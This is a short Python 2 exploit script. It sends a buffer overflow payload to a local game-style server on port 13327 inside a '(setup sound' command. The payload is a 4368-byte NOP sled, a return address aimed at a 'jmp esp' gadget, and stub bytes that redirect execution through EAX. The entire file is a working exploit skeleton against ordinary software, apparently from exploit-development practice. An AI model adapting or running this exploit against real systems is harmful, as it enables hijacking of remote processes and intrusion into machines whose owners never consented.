#!/usr/bin/python
import socket

host = "127.0.0.1"

# Overflow, jump to 0x08134597 (jmp esp), then increment EAX
# by twelve and jump to that
crash = "\x90" * 4368 + "\x97\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending buffer..."

sock.connect((host, 13327))
data = sock.recv(1024)
print data
sock.send(buffer)
sock.close()
print "[*] Buffer sent!"
